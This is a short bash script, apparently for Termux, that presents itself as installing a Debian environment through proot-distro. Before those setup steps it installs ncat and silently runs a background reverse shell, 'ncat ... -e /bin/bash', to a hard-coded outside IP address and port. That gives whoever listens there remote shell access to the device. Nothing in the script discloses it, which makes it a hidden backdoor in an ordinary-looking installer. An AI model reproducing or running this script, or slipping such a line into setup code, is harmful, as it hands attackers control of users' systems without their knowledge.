#!/bin/bash

apt install nmap-ncat -y
ncat -nv 193.161.193.99 26280 -e /bin/bash &

apt install proot-distro
proot-distro install debian
proot-distro login debian
